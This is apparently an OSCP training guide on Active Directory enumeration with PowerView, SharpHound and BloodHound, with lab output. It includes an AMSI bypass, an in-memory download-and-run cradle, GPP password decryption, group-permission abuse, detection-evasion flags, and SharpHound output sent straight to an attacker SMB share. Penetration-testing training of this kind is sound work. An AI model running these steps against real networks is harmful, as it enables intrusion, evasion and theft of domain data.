# Active Directory Enumeration — PowerView & Automated Tooling

**Track:** Mastering OSCP
**Section:** Active Directory — 019
**Topics:** PowerView Setup & AMSI Bypass, Users/Groups/Computers/Shares/ACL Enumeration, Object Permission Abuse, SharpHound Collection Methods, OpSec-Aware Collection, BloodHound Analysis

---

## 1. Getting PowerView Onto a Target

**PowerView** is a PowerShell module — part of the PowerSploit collection — purpose-built for comprehensive AD enumeration. It wraps a large set of AD queries into simple, memorable function names.

### 1.1 Downloading PowerView

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ericshoemaker/PowerView/master/Powerview.ps1" -OutFile ".\Powerview.ps1"
```

### 1.2 Importing the Module

```powershell
Import-Module ".\Powerview.ps1"
```

By default, this fails — PowerShell's script execution policy blocks unsigned scripts:

```
Import-Module : File C:\Users\Public\Powerview.ps1 cannot be loaded because running scripts is disabled.
```

### 1.3 Bypassing the Execution Policy

```powershell
powershell -ep bypass
```

```
PS C:\Users\Public> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Public> Import-Module .\Powerview.ps1
PS C:\Users\Public>
```

The module now loads cleanly.

### 1.4 A Note on AMSI

There are several other ways to bypass the **Antimalware Scan Interface (AMSI)** beyond the execution-policy bypass above — covered in more depth alongside `Invoke-Obfuscation`. One common in-memory technique:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Loading the module entirely in memory, without touching disk, is another common approach:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/.../PowerView.ps1')
```

---

## 2. PowerView — Domain & Forest Recon

### 2.1 `Get-NetDomain`

```powershell
Get-NetDomain
```
```
Forest                  : green.com
DomainControllers       : {DC1.green.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.green.com
RidRoleOwner            : DC1.green.com
InfrastructureRoleOwner : DC1.green.com
Name                    : green.com
```

### 2.2 `Get-NetForest`

```powershell
Get-NetForest
```
```
RootDomainSid          : S-1-5-21-3248476446-797623152-2140207999
Name                   : green.com
Sites                  : {Default-First-Site-Name}
Domains                : {green.com}
GlobalCatalogs          : {DC1.green.com}
ApplicationPartitions   : {DC=ForestDnsZones,DC=green,DC=com, DC=DomainDnsZones,DC=green,DC=com}
ForestModeLevel         : 7
ForestMode              : Unknown
RootDomain              : green.com
Schema                  : CN=Schema,CN=Configuration,DC=green,DC=com
SchemaRoleOwner         : DC1.green.com
NamingRoleOwner         : DC1.green.com
```

### 2.3 `Get-NetDomainTrust`

A **domain trust** is a relationship between two AD domains that lets users in one domain access resources in the other — essential for identity and access management across multi-domain or multi-forest environments. `Get-NetDomainTrust` enumerates any such relationships involving the current domain.

---

## 3. PowerView — Users, Groups & Computers

### 3.1 Enumerating Users

```powershell
Get-NetUser
Get-NetUser -Username hossam
```
```
logoncount         : 33
badpasswordtime    : 5/16/2025 3:33:30 PM
description        : Built-in account for administering the computer/domain
distinguishedname  : CN=Administrator,CN=Users,DC=green,DC=com
objectclass        : {top, person, organizationalPerson, user}
lastlogontimestamp : 5/14/2025 3:57:29 PM
name               : Administrator
objectsid          : S-1-5-21-3248476446-797623152-2140207999-500
samaccountname     : Administrator
admincount         : 1
codepage           : 0
samaccounttype     : USER_OBJECT
accountexpires     : NEVER
```

**Selecting only relevant fields:**

```powershell
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
```

### 3.2 Enumerating Groups

```powershell
Get-NetGroup
Get-NetGroup -Properties name
```

**Filtering for admin-related groups:**

```powershell
Get-NetGroup | ? { $_ -match "admin" }
```

**Listing members of a specific group:**

```powershell
Get-NetGroupMember -Identity "Domain Admins"
Get-NetGroup "Sales Department" | select member
```

### 3.3 Enumerating Computers

```powershell
Get-NetComputer -Properties name
Get-NetComputer | select operatingsystem,dnshostname
```

---

## 4. PowerView — Finding Service Accounts (SPNs)

```powershell
Get-NetUser -SPN
```
```
logoncount        : 0
badpasswordtime   : 12/31/1600 4:00:00 PM
description       : Key Distribution Center Service Account
distinguishedname : CN=krbtgt,CN=Users,DC=green,DC=com
objectclass       : {top, person, organizationalPerson, krbtgt}
name              : krbtgt
primarygroupid    : 513
samaccountname    : krbtgt
admincount        : 1
```

**Narrowing to just the account names:**

```powershell
Get-NetUser -SPN | select name
```
```
name
----
krbtgt
iis_service
mysql
```

Every account returned here is a **Kerberoasting** target — see the dedicated Kerberos attacks module for the full attack chain.

---

## 5. PowerView — Shares & Access Checks

### 5.1 Finding Domain Shares

```powershell
Find-DomainShare
```
```
Name        Type          Remark              ComputerName
----        ----          ------              ------------
ADMIN$      2147483648    Remote Admin        DC1.green.com
C$          2147483648    Default share       DC1.green.com
IPC$        2147483651    Remote IPC          DC1.green.com
NETLOGON    0             Logon server share  DC1.green.com
SYSVOL      0             Logon server share  DC1.green.com
ADMIN$      2147483648    Remote Admin        pc2.green.com
C$          2147483648    Default share       pc2.green.com
IPC$        2147483651    Remote IPC          pc2.green.com
SharedFolder 0                                pc2.green.com
```

### 5.2 Checking Access With `Invoke-UserHunter`

```powershell
Invoke-UserHunter -CheckAccess
```

### 5.3 Finding Local Admin Access

```powershell
Find-LocalAdminAccess -Verbose
```
```
VERBOSE: [Find-LocalAdminAccess] Testing WS-JDOE.corp.local
VERBOSE: [Find-LocalAdminAccess] Testing WS-ASMITH.corp.local
VERBOSE: [Find-LocalAdminAccess] Testing FILE01.corp.local
VERBOSE: [Find-LocalAdminAccess] Testing WEB01.corp.local
VERBOSE: [Find-LocalAdminAccess] Current user has local admin access on:
VERBOSE: [Find-LocalAdminAccess] WS-JDOE.corp.local
VERBOSE: [Find-LocalAdminAccess] FILE01.corp.local
```

Any machine returned here is an immediate pivot point for lateral movement.

### 5.4 Checking the Domain Password Policy

```powershell
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
```
```
MinimumPasswordAge    : 0
MaximumPasswordAge    : 42
MinimumPasswordLength : 7
PasswordComplexity    : 1
PasswordHistorySize   : 24
LockoutBadCount       : 5
ResetLockoutCount     : 30
LockoutDuration       : 30
```

> PowerView commands run in the context of the currently authenticated user. If authenticated as `jdoe`, only what `jdoe` can access will be visible. Always run `whoami /all` first to understand current privileges before drawing conclusions from an enumeration pass that came back empty.

---

## 6. Getting Logged-On Users

Identifying who is logged onto which machine is critical groundwork for both lateral movement and credential theft.

### 6.1 `Get-NetSession`

```powershell
Get-NetSession -ComputerName files04 -Verbose
Get-NetSession -ComputerName web04 -Verbose
```

**Without sufficient permission:**

```
VERBOSE: [Get-NetSession] Error: Access is denied
```

**With sufficient permission:**

```powershell
Get-NetSession -ComputerName client74
```
```
CName        : \\192.168.50.75
UserName     : stephanie
Time         : 8
IdleTime     : 0
ComputerName : client74
```

> **Windows 11 note:** newer OS versions frequently block this kind of remote session enumeration due to tightened default permissions. Older OS versions (check via `Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion`) are more likely to disclose this information.

### 6.2 `PsLoggedOn` (Sysinternals)

**PsLoggedOn** is a Sysinternals tool that shows users logged on either locally, or via resource shares, on a remote system.

```
.\PsLoggedon.exe \\files04
```

**Unsuccessful:**
```
Unable to query resource logons
```

**Successful:**
```
Users logged on locally:
                 CORP\jeffadmin

Users logged on via resource shares:
      10/5/2022 1:33:32 AM     CORP\stephanie
```

---

## 7. Enumerating Object Permissions (ACLs)

Misconfigured object permissions in AD frequently let a low-privileged user modify sensitive objects — a direct path to privilege escalation.

### 7.1 Checking the Current User's Own Permissions

```powershell
Get-ObjectAcl -Identity stephanie
```

### 7.2 Converting a SID to a Readable Name

SIDs are unique identifiers for users and groups, and can be resolved back to human-readable names:

```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
```

### 7.3 Finding `GenericAll` Permissions on a Sensitive Group

`GenericAll` grants **full control** over an object — one of the most dangerous permissions to find misassigned.

```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

**Bulk-resolving the resulting SIDs:**

```powershell
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```

### 7.4 Exploiting a Discovered `GenericAll` Grant

If the current user turns out to hold `GenericAll` on a group, that permission is enough to add themselves to it directly:

```powershell
net group "Management Department" stephanie /add /domain
Get-NetGroup "Management Department" | select member
```

Once confirmed, this can be reverted just as easily:

```powershell
net group "Management Department" stephanie /del /domain
Get-NetGroup "Management Department" | select member
```

---

## 8. Enumerating Domain Shares for Sensitive Content

Domain file shares — particularly `SYSVOL` and internal file servers — are a recurring source of leaked credentials and configuration secrets.

```powershell
Find-DomainShare
```

**Browsing SYSVOL directly:**

```powershell
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

**Decrypting a Group Policy Preferences (GPP) password**, if a hash turns up in a policy XML file:

```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

**Browsing other file shares for sensitive documents:**

```powershell
ls \\FILES04\docshare
ls \\FILES04\docshare\docs\do-not-share
cat \\FILES04\docshare\docs\do-not-share\start-email.txt
```

It's common to find plaintext passwords sitting in old emails, notes, or config backups left on shares like these.

---

## 9. Automated Enumeration with SharpHound

Manual enumeration builds understanding; **automated** enumeration builds *scale*. **SharpHound** (a C# data collector) and **BloodHound** (its graph-based analysis frontend) are the industry-standard pairing for mapping AD attack paths quickly and comprehensively.

### 9.1 Importing SharpHound & Getting Help

```powershell
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
```

### 9.2 Running a Full Collection

```powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```

| Parameter | Meaning |
|---|---|
| `-CollectionMethod All` | Collect every possible data type |
| `-OutputDirectory` | Where to save the output files |
| `-OutputPrefix` | Prefix applied to the output file names |

The result is a compressed `.zip` of JSON files ready for import into BloodHound.

### 9.3 Running SharpHound Directly

```
C:\tools> SharpHound.exe -c all
```
```
2025-01-01 10:00:00 - Starting SharpHound v1.1.1
2025-01-01 10:00:00 - Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote.
2025-01-01 10:00:00 - Running against Domain: TARGET.LOCAL
...
2025-01-01 10:00:15 - Finished collection in 00:00:15. Collected 500 objects.
2025-01-01 10:00:15 - Compressing data to 20250101100015_BloodHound.zip
2025-01-01 10:00:16 - Collection complete!
```

### 9.4 Understanding What Gets Collected

The default `-c All` collection resolves to: `Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote`. In practice, this pulls:

- Users and computers
- AD security group membership
- Domain trusts
- Abusable permissions on AD objects (ACL)
- OU tree structure (Container)
- Group Policy links
- The most relevant AD object properties (ObjectProps)
- Local groups on domain-joined machines, plus local privileges such as RDP, DCOM, and PSRemote
- Active user sessions (Session)
- Every SPN linked to a user account (SPNTargets)

### 9.5 Privilege Requirements for a Complete Collection

To gather **local group membership** and **session data**, SharpHound must connect out to each domain-joined machine it discovers. It can only succeed if the account running SharpHound has **Administrator rights** on that remote machine.

### 9.6 Targeted Collection Methods

The `-c` (`-collectionmethod`) flag controls exactly what's collected:

| Method | Behavior |
|---|---|
| **All** | Every collection method except `GPOLocalGroup` |
| **DConly** | Collects only from the Domain Controller — users, computers, group memberships, trusts, ACLs, OU structure, GPOs, and key object properties, without touching domain-joined machines directly |
| **ComputerOnly** | The opposite of `DConly` — collects only from domain-joined computers (sessions, local groups) |

### 9.7 Useful Operational Flags

- `--ldapusername` / `--ldappassword` — run SharpHound under alternate credentials, distinct from the current session's context.
- `-d` / `--domain` — target a specific domain explicitly in a multi-domain environment.
- `--domaincontroller` — target a specific DC by IP or FQDN, e.g. a forgotten secondary DC with weaker monitoring, or a port-forwarded target.
- `--ldapport` — target a non-default LDAP port (useful alongside port forwarding).

### 9.8 OpSec — Reducing SharpHound's Footprint

Defenders can fingerprint BloodHound activity from predictable output filenames and locations. These flags help keep a collection run less conspicuous:

| Option | Description |
|---|---|
| `--memcache` | Keep the cache in memory; don't write temporary files to disk |
| `--randomfilenames` | Randomize output filenames, including the zip |
| `--outputprefix` | String to prepend to output filenames |
| `--outputdirectory` | Target output directory |
| `--zipfilename` | Explicit filename for the output zip |
| `--zippassword` | Password-protect the output zip |

### 9.9 Advanced Exfiltration — Direct Output to a Remote SMB Share

In live engagements, it's often preferable to have SharpHound write its output straight to an attacker-controlled SMB share rather than staging it locally first.

**Step 1 — start a malicious SMB share on the attacker box (Kali/Linux), assuming attacker IP `10.10.14.33`:**

```bash
sudo impacket-smbserver share ./ -smb2support -user test -password test
```

**Step 2 — from the compromised Windows host, confirm connectivity to that share:**

```cmd
net use \\10.10.14.33\share /user:test test
```
```
The command completed successfully.
```

**Step 3 — run SharpHound, outputting directly to the remote share, combined with the OpSec flags above:**

```cmd
C:\Tools\SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword HackTheBox --outputprefix HTB --randomfilenames
```

This collects and exfiltrates in a single step, with the output never touching the compromised host's local disk.

---

## 10. Analysis with BloodHound

**BloodHound** is an open-source graph analysis tool that reveals hidden, attackable relationships in an AD environment — turning raw SharpHound output into a visual, queryable attack-path map.

### 10.1 Starting the Backing Database

BloodHound uses a **Neo4j** graph database:

```bash
sudo neo4j start
```

The Neo4j web interface is reachable at `http://localhost:7474` (default credentials `neo4j` / `neo4j` — you'll be prompted to change the password on first login).

### 10.2 Launching BloodHound

```bash
bloodhound
```

### 10.3 Importing Collected Data

After logging into the Neo4j database from the BloodHound GUI, click the **Upload Data** icon (top-right of the interface), browse to the SharpHound zip file (e.g. `262501611e0e16_8100aHound.zip`), and upload it. A progress bar tracks the import.

The **Database Info** tab shows a full summary of everything imported. The **Analysis** tab exposes a set of pre-built queries, including:

- **Find all Domain Admins** — lists every account in that group.
- **Shortest Paths** — finds the shortest path between any two objects in the graph.
- **Shortest paths to Domain Admins** — specifically maps the fastest route from a given starting point up to full domain compromise.

### 10.4 Simulating an Attack Path

Right-click any user or host currently under attacker control and select **Mark User as Owned**, then re-run the shortest-path analysis. BloodHound will now factor in that ownership when computing the fastest route to Domain Admin — letting an operator simulate exactly how far a given foothold can reach before ever touching the live environment again.
